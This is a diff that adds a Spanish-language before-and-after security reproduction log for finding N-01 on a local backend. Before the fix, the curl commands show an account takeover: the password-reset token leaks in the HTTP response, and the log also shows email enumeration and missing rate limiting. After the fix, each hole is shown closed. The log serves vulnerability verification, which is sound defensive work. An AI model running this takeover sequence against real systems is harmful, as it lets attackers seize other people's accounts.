@@ -1,0 +1,93 @@
+===============================================================================
+ N-01 · reproduccion manual contra el backend real (127.0.0.1:6003)
+ ANTES del arreglo — commit cf24b6c, 2026-09-05T18:27:54Z
+===============================================================================
+
+--- 0. crear la cuenta victima -------------------------------------------------
+$ curl -sS -w ' <- %{http_code}' -X POST $BASE/auth/signup -d '{...email:n01.victima@example.com, password:Victima1234!...}'
+{"accessToken":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxNCIsImlzcyI6ImV2b2x1dGlvbmRldm14IiwiaWF0IjoxNzg4NjMyODc1LCJleHAiOjE3ODg2MzY0NzUsImVtYWlsIjoibjAxLnZpY3RpbWFAZXhhbXBsZS5jb20iLCJyb2xlIjoiVVNFUiJ9.lMlmcfAcLvvvRlNxZK7aQZ-k5olpZlsiBFbE41yHguc","refreshToken":"Z1g-fE-6dA8PbDE9tZ_oCwhkcLEe9eZtbRMfrBzubSFaebXaLMtTV6DhKacdDC7dPZPmIiAzEg8DUKtx2NKrmmi_yZ4zLVeq-NV9h1zXsyGFSMpj9o7ckZDie3SpyHFFTPWw9k4Cinufh0yx9
+--- 1. pedir el restablecimiento SIN AUTENTICAR --------------------------------
+$ curl -sS -X POST $BASE/auth/request-password-reset -d '{"email":"n01.victima@example.com"}'
+{"message":"Se ha enviado un correo de recuperación a tu cuenta","resetToken":"CKZd8D97E1DChtkRhDqIdwgYspD1sqpX18Coil39ubCfhRoiP3RH58ELBtbYVo7UOC-khxDL-oloIBzvGkzvdOX2IS1lEaqlbDMOljT-wbTTzPe9g13wZKemTX8wZQ_hURg6BEnpgyXNXwOil6voEBzgEkKJGptb_pQfhe2Xk5o"} <- 200
+
+    resetToken de 171 caracteres ENTREGADO EN EL CUERPO, sin autenticar.
+
+--- 2. usar ese token para poner la contrasena DEL ATACANTE ---------------------
+$ curl -sS -X POST $BASE/auth/reset-password -d '{"resetToken":"<el de arriba>","newPassword":"Atacante1234!"}'
+{"message":"La contraseña se actualizo correctamente"} <- 200
+
+--- 3. entrar con la contrasena DEL ATACANTE ------------------------------------
+POST /auth/token  password=Atacante1234! (atacante) <- 200
+POST /auth/token  password=Victima1234!  (victima)  <- 401
+    LA CUENTA ES DEL ATACANTE. Dos peticiones, sin correo, sin sesion.
+
+--- 4. y con la cuenta MASTER de la demostracion --------------------------------
+{"timestamp":"05/09/2026 18:28:14","statusCode":400,"errors":{"error":"No existe un usuario con el email proporcionado"}} <- 400
+
+--- 5. enumeracion de cuentas (400 vs 200) --------------------------------------
+request-password-reset  correo QUE EXISTE     <- 200
+{"timestamp":"05/09/2026 18:28:15","statusCode":400,"errors":{"error":"No existe un usuario con el email proporcionado"}}request-password-reset  correo QUE NO EXISTE  <- 400
+
+--- 6. sin limitador: 12 peticiones seguidas, ni un 429 -------------------------
+200 200 200 200 200 200 200 200 200 200 200 200 
+--- 7. /auth/signup tampoco pasa por el limitador: 8 seguidas -------------------
+400 400 400 400 400 400 400 400 
+    (400 = correo ya tomado, y ademas ENUMERA; ningun 429 en ninguna de las dos series)
+
+--- 8. tras `scripts/seed-demo.sh`: la MISMA llamada sobre la cuenta MASTER -----
+$ curl -sS -X POST $BASE/auth/request-password-reset -d '{"email":"demo.master@example.com"}'
+{"message":"Se ha enviado un correo de recuperación a tu cuenta","resetToken":"IpBDNGrBlY0FXQCqwWUx…(recortado, 171 chars)"} <- 200
+    El camino llega hasta el rol MASTER. FIN DEL «ANTES».
+
+===============================================================================
+ DESPUES del arreglo — mismo backend, recompilado. 2026-09-05T18:49:53Z
+ (base recreada por el reinicio del Postgres efimero: se crea otra victima)
+===============================================================================
+
+--- 1. crear la cuenta victima -------------------------------------------------
+POST /auth/signup <- 200
+
+--- 2. pedir el restablecimiento: YA NO SALE EL TOKEN ---------------------------
+$ curl -sS -X POST $BASE/auth/request-password-reset -d '{"email":"n01.victima2@example.com"}'
+{"message":"Si el correo corresponde a una cuenta, te enviamos un enlace para restablecer la contraseña"} <- 200
+    Sin resetToken: el paso 2 del recorrido de toma de cuenta se queda sin insumo.
+
+--- 3. y la MASTER de la demostracion, igual -----------------------------------
+{"message":"Si el correo corresponde a una cuenta, te enviamos un enlace para restablecer la contraseña"} <- 200
+
+--- 4. enumeracion CERRADA: 200 y MISMO cuerpo exista o no ----------------------
+correo QUE EXISTE     : {"message":"Si el correo corresponde a una cuenta, te enviamos un enlace para restablecer la contraseña"} <- 200
+correo QUE NO EXISTE  : {"message":"Si el correo corresponde a una cuenta, te enviamos un enlace para restablecer la contraseña"} <- 200
+
+--- 5. LIMITADOR en request-password-reset: 8 peticiones seguidas ---------------
+200 200 200 200 200 429 429 429    <- 429 a partir del sexto
+   cuerpo del 429: {"timestamp":"05/09/2026 18:50:17","statusCode":429,"errors":{"error":"Demasiados intentos. Espera unos minutos e inténtalo de nuevo."}}
+
+--- 6. AMBITOS: agotar la recuperacion NO cierra el acceso de la victima --------
+    (es la denegacion de servicio que el propio arreglo podria haber creado)
+    POST /auth/token con la contrasena BUENA de n01.victima3@example.com ... 401
+    401 = credenciales (esa cuenta no existe), NO 429: el cubo de acceso esta intacto.
+    POST /auth/token de la cuenta demo (existe) ....... 401
+
+--- 7. LIMITADOR en signup: 8 altas seguidas del MISMO correo ya tomado ---------
+400 400 400 400 400 429 429 429    <- 400 (correo tomado) y 429 a partir del sexto: la enumeracion por signup queda acotada
+
+--- 8. y el registro agotado tampoco cierra el acceso de esa cuenta -------------
+    POST /auth/token de n01.victima2 con su contrasena ... 200
+    200 = entra sin problema. FIN DEL «DESPUES».
+
+--- 9. repetido ya con la demostracion sembrada (la linea 6 se midio antes de --
+       volver a sembrar, cuando demo.boda todavia no existia) -------------------
+    5 recuperaciones de demo.boda@example.com: 200 200 200 200 200 | la 6.a: 429
+    y la dueña legitima ENTRA igual (POST /auth/token) ... 200
+    200. El ambito RECUPERACION se agoto y el de ACCESO ni se entero: era el
+    riesgo de convertir el arreglo de N-01 en una denegacion de servicio nueva.
+
+--- 10. el flujo LEGITIMO de recuperacion sigue entero --------------------------
+    (el token solo llega por correo; aqui se lee de la fila customer para poder
+     demostrar que el flujo no se ha roto, solo se ha cerrado su fuga por HTTP)
+    token guardado en customer.resettoken: 171 chars
+    POST /auth/reset-password con ese token ......... {"message":"La contraseña se actualizo correctamente"} <- 200
+    y entra con la contrasena nueva ................. 200
+    Lo unico que se ha cerrado es que el token salga por HTTP a quien no ha
+    leido el correo. FIN DEL «DESPUES».
